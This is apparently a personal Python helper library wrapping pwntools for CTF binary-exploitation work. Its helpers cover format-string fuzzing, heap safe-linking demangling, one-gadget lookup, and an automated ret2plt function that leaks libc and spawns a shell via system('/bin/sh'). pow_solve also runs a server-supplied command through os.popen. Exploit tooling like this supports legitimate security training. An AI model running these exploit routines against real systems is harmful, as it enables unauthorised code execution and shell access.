#!/usr/bin/env python3
# Author: @TheFlash2k

"""
flashlib - A wrapper around pwntools but also with a few of the functions that I use on a daily basis.
"""

# Since we're always making use of pwntools
from pwn import *

# We'll also make use of ctypes for libc.srand and libc.rand functions
from ctypes import *

# For enums:
from enum import Enum

# For adding more functions to existing class
from functools import wraps

# For getting variable names and other stuff
import inspect

# https://mgarod.medium.com/dynamically-add-a-method-to-a-class-in-python-c49204b85bd6
def add_method(cls):
	def decorator(func):
		@wraps(func) 
		def wrapper(self, *args, **kwargs): 
			return func(self, *args, **kwargs)
		setattr(cls, func.__name__, wrapper)
		# Note we are not binding func, but wrapper which accepts self but does exactly the same as func
		return func # returning func means func can still be used normally
	return decorator

# This is for my tmux setup
context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.log_level = 'info'

encode   = lambda e: e if type(e) == bytes else str(e).encode()
hexleak  = lambda l: int(l[:-1] if (l[-1] == b'\n' or l[-1] == '\n') else l, 16)
fixleak  = lambda l: unpack((l[:-1] if (l[-1] == b'\n' or l[-1] == '\n') else l).ljust(8, b"\x00"))
rfixleak = lambda l: unpack((l[:-1] if (l[-1] == b'\n' or l[-1] == '\n') else l).rjust(8, b"\x00"))
diff_hn  = lambda i, j: ((i - j) % 65536)
diff_hhn = lambda i, j: ((i - j) % 256)
mangle   = lambda heap_addr, val: (heap_addr >> 12) ^ val
func_byte_array_hhn = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
func_byte_array_hn  = lambda func_addr: [(func_addr >> (16 * i)) & 0xFFFF for i in range((func_addr.bit_length() + 7) // 16)]

# For later use.
io = exe = cleaned_exe = libc = elf = ctype_libc = None

def demangle(val: int):
	"""
	For heap-based challenges with safe-linking enabled.
	"""
	mask = 0xfff << 52
	while mask:
		v = val & mask
		val ^= (v >> 12)
		mask >>= 12
	return val

def p24(a):
	return p32(a)[:-1][::-1]

def p56(a):
	return p64(a)[:-1][::-1]

def big_p32(a):
	return p32(a)[::-1]

def big_p64(a):
	return p64(a)[::-1]

def one_gadget(libc: ELF):
	"""
	Extracts one gadgets from an existing libc object.
	"""
	base_addr = libc.address
	info("Extracting one-gadgets for %s with base @ %#x" % (libc.path, base_addr))
	return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', libc.path]).decode().split(' ')]

def my_fill(data, mod=8, pad_char=b"|"):
	return encode(data) + encode(pad_char) * (len(encode(data)) % mod)

def create_fmtstr(
	start: int,
	end: int = 0,
	atleast: int = 10,
	max_len: int = -1,
	with_index: bool = False,
	specifier: str = "p",
	seperator: str = '|'
) -> bytes:
	"""
	Creates a format string that we can use to fuzz and check at
	what index what data exists.
	"""
	end = start+atleast if end == 0 else end
	fmt = "{seperator}%{i}${specifier}" if not with_index else "{seperator}{i}=%{i}${specifier}"
	rt = ""
	for i in range(start, end+1):
		rt += fmt.format(i=i, specifier=specifier, seperator=seperator)
	''' Making sure we always get a valid fmt in the max_len range '''
	if max_len <= 0:
		return rt.encode()
	rt = seperator.join(rt[:max_len].split(seperator)[:-1]) \
		if rt[:max_len][-1] != specifier else rt[:max_len]
	return rt.encode()

def validate_tube(comm: pwnlib.tubes = None):
	"""
	Simply validates if IO exists in the global namespace.
	"""
	if comm:
		return comm
	_io = globals().get('io', None)
	if not _io:
		error("No tube for communication specified!")
	return _io

def pow_solve(comm: pwnlib.tubes = None):
	"""
	Solves proof of work for:

	1. theflash2k/pwn-chal
	2. pwn.red/jail
	"""
	io = validate_tube(comm)
	cmd = io.recvlines(2)[1].decode()
	info(f"Solving PWNCHAL POW: {cmd.split()[-1]}")
	_pow = os.popen(cmd).read()
	_pow = _pow.split(': ')[1] if ': ' in _pow else _pow # pwn-chal
	info(f"Solved Proof-of-work: {_pow}")
	io.sendlineafter(b": ", encode(_pow))

def parse_host(args: list):
	"""
	args: list
		Arguments that will be parsed to extract only IP and port.

	Returns: parsed tuple with (IP, PORT)
	"""
	# We'll firstly check if 'nc' exists:
	args = args[1:] # remove the filename
	if args[0] == 'nc':
		args = args[1:]
	if ':' in args[0]:
		args = args[0].split(':')
	return (args)

def attach(
	gdbscript: str = "",
	halt: bool = False,
	remote: tuple = None,
	_io: pwnlib.tubes = None,
	gdbpath: str = "/usr/bin/gdb",
):
	"""
	halt: bool
		Halt and waits for input when attaching gdb.
		Default: False
	"""

	io = validate_tube(_io)
	gdbscript = (f"file {cleaned_exe}\n" if args.REMOTE else "") + gdbscript

	if not remote:
		remote = ("127.0.0.1", 1234)

	_exe, _mode = (None, io) if not args.REMOTE else (gdbpath, remote)
	if args.GDB:
		"""
		We want to halt before attaching our gdb it it's
		in debug mode and remote mode.

		Remote will always halt first.
		"""
		print((halt and _exe))
		if (halt and _exe) or (remote and args.REMOTE): input("[?] Attach GDB?")
		gdb.attach(_mode, exe=_exe, gdbscript=gdbscript)
		if halt and not _exe: input("[?] Continue?")

def get_ctx(
	_exe: str = None,
	aslr: bool = False,
	remote_host: tuple = None,
	keyfile: str = "~/.ssh/id_rsa"
):
	if _exe:
		global exe, cleaned_exe
		exe = _exe.split()
		cleaned_exe = exe[0]

	if not remote_host and args.REMOTE:
		remote_host = parse_host(sys.argv)

	if args.COLLEGE:
		# for all my pwn-college enthuiasts:
		sh = ssh(user="hacker", host="dojo.pwn.college", keyfile=keyfile)
		io = sh.process(f"/challenge/{cleaned_exe}")
	else:
		io = remote(*remote_host) if args.REMOTE else process(argv=exe, aslr=aslr)
	return io

def init(
	base_exe: str,
	argv: list = None,
	libc_path: str = None,
	aslr: bool = False,
	get_libc: bool = True,
	setup_rop: bool = False,
	setup_libc_rop: bool = False
):
	import importlib
	global io, exe, cleaned_exe, libc, elf, ctype_libc

	exe         = ([base_exe] + argv) if argv else base_exe.split()
	cleaned_exe = exe[0] # actual file name
	elf         = context.binary = ELF(cleaned_exe)
	if get_libc and elf.get_section_by_name('.dynamic'):
		libc = elf.libc if not libc_path else ELF(libc_path)
		try:
			ctype_libc = cdll.LoadLibrary(libc.path)
		except:
			ctype_libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

	io = get_ctx(aslr=aslr)

	# Since it's a library, we need to update the caller global frame
	caller_globals = sys._getframe(1).f_globals
	caller_globals.update({'io': io, 'exe': exe, 'elf': elf, 'cleaned_exe': cleaned_exe})
	sys.modules[__name__].__dict__.update({'io': io, 'exe': exe, 'elf': elf, 'cleaned_exe': cleaned_exe})

	rt = [io, elf]
	if get_libc:
		caller_globals.update({'libc': libc, 'ctype_libc': ctype_libc})
		rt.append(libc)

	if setup_rop:
		rop = ROP(elf)
		caller_globals.update({'rop': rop})
		sys.modules[__name__].__dict__.update({'rop': rop})
		rt.append(rop)

	if get_libc and setup_libc_rop:
		rop_libc = ROP(libc)
		caller_globals.update({'rop_libc': rop_libc})
		sys.modules[__name__].__dict__.update({'rop_libc': rop_libc})
		rt.append(rop_libc)

	return rt

"""
Custom methods to be added to the pwnlib.tubes.*.* classes
"""
@add_method(pwnlib.tubes.process.process)
@add_method(pwnlib.tubes.remote.remote)
@add_method(pwnlib.tubes.ssh.ssh)
@add_method(pwnlib.tubes.ssh.ssh_process)
def recvafter(
	self,
	delim: bytes,
	n: int = 0x0,
	drop: bool = True,
	keepends: bool = False,
	timeout: int = pwnlib.timeout.maximum
):
	self.recvuntil(encode(delim), drop=drop, timeout=timeout)
	return self.recv(n, timeout=timeout) if n else \
		self.recvline(keepends=keepends, timeout=timeout)

@add_method(pwnlib.tubes.process.process)
@add_method(pwnlib.tubes.remote.remote)
@add_method(pwnlib.tubes.ssh.ssh)
@add_method(pwnlib.tubes.ssh.ssh_process)
def recvafteruntil(
	self,
	delim_before: bytes,
	delim_after: bytes = b"\n",
	drop: bool = True,
	timeout: int = pwnlib.timeout.maximum
):
	self.recvuntil(encode(delim_before), drop=drop, timeout=timeout)
	return self.recvuntil(encode(delim_after), drop=drop, timeout=timeout)

"""
The only reason I am creating classes is because
if I don't do that, the default parameters would fail
because elf wouldn't be set and it would fail on .{got,plt}
"""
class elf:
	class got: puts = None
	class sym: main = None
	class plt: puts = None

def ret2plt(
	offset: int,
	got_fn: int       = elf.got.puts,
	plt_fn: int       = elf.plt.puts,
	ret_fn: int       = elf.sym.main,
	got_fn_name: str  = 'puts',
	rets: int         = 0x1,
	sendafter: bytes  = b"\n",
	postfix: bytes    = None,
	sendline: bool    = True,
	getshell: bool    = True,
	_io: pwnlib.tubes = None,
) -> int:

	"""
	ret2plt - Performs rop automatically to get libc leak and
				attempts to spawn a shell.

	offset: int [ REQUIRED ]
		The offset at which we control RIP.

	got_fn: int
		The GOT entry which we want to leak from libc.
		Default: puts

	plt_fn: int
		The PLT entry with which got_fn will be passed in RDI.
		Default: puts

	ret_fn: int
		The function which will be invoked directly after the plt_fn
		Default: main

	got_fn_name: str
		The name of the GOT function leaked (required to calculte base.)
		Default: "puts"

	rets: int
		The number of RETs added for stack-alignment
			For system("/bin/sh"), there will always be -1 added to rets
			to keep the stack aligned.
		Default: 0x1

	sendafter: bytes
		The delimiter after which payload will be sent.
		Default: NEWLINE

	postfix: bytes
		The delimiter after which is the libc leak. Usually end-remarks.
		Default: None

	sendline: bool
		Whether to send a newline with the payload or not.
		If true, uses io.sendlineafter else io.sendafter
		Default: True

	getshell: bool
		If set, it will use the rop chain to call 'system("/bin/sh")'
		to spawn a shell and will also validate if the shell works.
		Default: True

	_io: pwnlib.tubes
		Used in scenario if the base pwnlib.tubes.*.* is not io but
		something else. It will be validated as well.
		Default: None
			(uses underlying io that was created when "init" was invoked)
	"""

	global libc, rop

	got_fn = elf.got.puts if not got_fn else got_fn
	plt_fn = elf.plt.puts if not plt_fn else plt_fn
	ret_fn = elf.sym.main if not ret_fn else ret_fn

	io = validate_tube(_io)
	rop = ROP(elf)
	payload = flat(
		cyclic(offset, n=8),
		rop.rdi.address,
		got_fn,
		plt_fn,
		p64(rop.ret.address)*rets,
		ret_fn)
	(io.sendlineafter if sendline else io.sendafter)(
		encode(sendafter), payload
	)
	libc_fn = libc.symbols.get(got_fn_name, None)
	if not libc_fn:
		error(f"{got_fn_name} is not a valid function in libc!")
	try:
		if postfix:
			io.recvuntil(encode(postfix))
		libc.address = fixleak(io.recv(6)) - libc.symbols[got_fn_name]
		if libc.address & 0xFFF != 0:
			error("Didn't get proper libc base. Please check if the libc used is correct with the binary itself!\nDEBUG: Got leak: %#x" % libc.address)
	except:
		error("There might have been some stack alignment issue. Please debug.")

	if getshell:
		logleak(libc.address)
		payload = flat(
			cyclic(offset, n=8),
			rop.rdi.address,
			next(libc.search(b"/bin/sh")),
			p64(rop.ret.address)*(rets+1), # there's always one more required here.
			libc.sym.system)
		try:
			(io.sendlineafter if sendline else io.sendafter)(
				encode(sendafter), payload)
			io.sendline(b"echo 'theflash2k'")
			io.recvuntil(b"theflash2k\n")
		except:
			error("There might have been some stack alignment issue. Please debug.")
		# Got shell:
		success("Got shell!")
		io.sendline(b"id")
		io.interactive()

	return libc.address

"""
These functions are for challenges where we have to
guess the random numbers using srand and rand
"""
try:
	ctype_libc = cdll.LoadLibrary(libc.path if globals().get('libc', None) else '/lib/x86_64-linux-gnu/libc.so.6')
except:
	ctype_libc = None

def libc_srand(seed: int = ctype_libc.time(0x0)):
	if ctype_libc:
		return ctype_libc.srand(seed)
	error("ctype_libc is not initialized!")

def libc_rand():
	if ctype_libc:
		return ctype_libc.rand()
	error("ctype_libc is not initialized!")

def logleak(var):
	frame = inspect.currentframe().f_back
	varname = None
	for name, value in frame.f_locals.items():
		if value is var:
			varname = name
			break
	if not varname:
		# this is for class attributes
		for obj_name, obj in frame.f_locals.items():
			if hasattr(obj, "__dict__"):
				for attr_name, attr_value in vars(obj).items():
					if attr_value is var:
						varname = f"{obj_name}.{attr_name[1:] if attr_name[0] == '_' else attr_name}"
						break
	if not varname:
		varname = "leak"

	info(f"%s @ %#x" % (varname, var))